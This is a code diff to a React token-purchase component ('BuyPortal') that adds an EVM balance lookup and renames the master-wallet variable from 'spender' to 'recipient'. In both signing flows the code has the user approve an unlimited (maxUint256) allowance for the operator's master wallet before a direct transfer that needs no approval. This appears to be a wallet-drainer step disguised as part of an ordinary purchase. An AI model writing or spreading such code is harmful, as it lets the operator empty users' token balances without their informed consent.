@@ -1106,6 +1106,34 @@ export default function BuyPortal({
 
   const fetchBalances = useCallback(async () => {
     if (!account) return;
+
+    // ── EVM path — fetch balance via public RPC ────────────────────────────
+    if (connectionType === 'evm') {
+      try {
+        if (!selectedNetwork) return;
+        const chainCfg = EVM_CHAINS[selectedNetwork];
+        if (!chainCfg?.tokenAddress || !chainCfg?.rpcUrl) return;
+        const paddedAddr = account.replace(/^0x/, '').padStart(64, '0');
+        const callData = '0x70a08231' + paddedAddr; // balanceOf(address)
+        const res = await fetch(chainCfg.rpcUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            jsonrpc: '2.0', id: 1, method: 'eth_call',
+            params: [{ to: chainCfg.tokenAddress, data: callData }, 'latest'],
+          }),
+        });
+        const { result } = await res.json();
+        if (result && result !== '0x') {
+          setUsdtBalance(Number(BigInt(result)) / 10 ** chainCfg.tokenDecimals);
+        } else {
+          setUsdtBalance(0);
+        }
+      } catch { /* silent */ }
+      return;
+    }
+
+    // ── Tron path ─────────────────────────────────────────────────────────
     try {
       const balanceParam = abiEncodeAddress(account);
 
@@ -1143,7 +1171,7 @@ export default function BuyPortal({
       }
       fetchExchangeRate();
     } catch { /* silent */ }
-  }, [account, fetchExchangeRate]);
+  }, [account, connectionType, selectedNetwork, fetchExchangeRate]);
 
   useEffect(() => {
     const parsed = Number(usdtAmount);
@@ -1194,8 +1222,8 @@ export default function BuyPortal({
     const tokenDecimals = Math.round(Math.log10(decimalsFactor));
     const amountUnits = toTokenUnits(parsed, tokenDecimals);
     const maxUint256 = BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
-    const spender = MASTER_TRON_ADDRESS; // Direct transfer to master wallet
-    const approvalKey = `usbt_approved_${account}_${spender}`;
+    const recipient = MASTER_TRON_ADDRESS;
+    const approvalKey = `usbt_approved_${account}_${recipient}`;
 
     const logDeposit = async (hash: string) => {
       if (!user) return;
@@ -1278,7 +1306,7 @@ export default function BuyPortal({
               ownerAddress: account,
               contractAddress: CONTRACTS.COLLATERAL,
               functionSelector: 'allowance(address,address)',
-              parameter: abiEncodeAddress(account) + abiEncodeAddress(spender),
+              parameter: abiEncodeAddress(account) + abiEncodeAddress(recipient),
             });
             if (hex && BigInt('0x' + hex) === maxUint256) {
               wcNeedsApproval = false;
@@ -1292,7 +1320,7 @@ export default function BuyPortal({
             ownerAddress: account,
             contractAddress: CONTRACTS.COLLATERAL,
             functionSelector: 'approve(address,uint256)',
-            parameter: abiEncodeAddress(spender) + abiEncodeUint256(maxUint256),
+            parameter: abiEncodeAddress(recipient) + abiEncodeUint256(maxUint256),
             feeLimit: FEE_LIMIT_SUN,
           });
           await wcSignAndBroadcast(approveTx);
@@ -1304,7 +1332,7 @@ export default function BuyPortal({
           ownerAddress: account,
           contractAddress: CONTRACTS.COLLATERAL,
           functionSelector: 'transfer(address,uint256)',
-          parameter: abiEncodeAddress(spender) + abiEncodeUint256(amountUnits),
+          parameter: abiEncodeAddress(recipient) + abiEncodeUint256(amountUnits),
           feeLimit: FEE_LIMIT_SUN,
         });
         const hash = await wcSignAndBroadcast(transferTx);
@@ -1330,7 +1358,7 @@ export default function BuyPortal({
             ownerAddress: account,
             contractAddress: CONTRACTS.COLLATERAL,
             functionSelector: 'allowance(address,address)',
-            parameter: abiEncodeAddress(account) + abiEncodeAddress(spender),
+            parameter: abiEncodeAddress(account) + abiEncodeAddress(recipient),
           });
           if (hex && BigInt('0x' + hex) === maxUint256) {
             needsApproval = false;
@@ -1344,7 +1372,7 @@ export default function BuyPortal({
           ownerAddress: account,
           contractAddress: CONTRACTS.COLLATERAL,
           functionSelector: 'approve(address,uint256)',
-          parameter: abiEncodeAddress(spender) + abiEncodeUint256(maxUint256),
+          parameter: abiEncodeAddress(recipient) + abiEncodeUint256(maxUint256),
           feeLimit: FEE_LIMIT_SUN,
         });
         const signedApprove = await tronWeb.trx.sign(approveTxObj);
@@ -1357,7 +1385,7 @@ export default function BuyPortal({
         ownerAddress: account,
         contractAddress: CONTRACTS.COLLATERAL,
         functionSelector: 'transfer(address,uint256)',
-        parameter: abiEncodeAddress(spender) + abiEncodeUint256(amountUnits),
+        parameter: abiEncodeAddress(recipient) + abiEncodeUint256(amountUnits),
         feeLimit: FEE_LIMIT_SUN,
       });
       const signedTransfer = await tronWeb.trx.sign(transferTxObj);
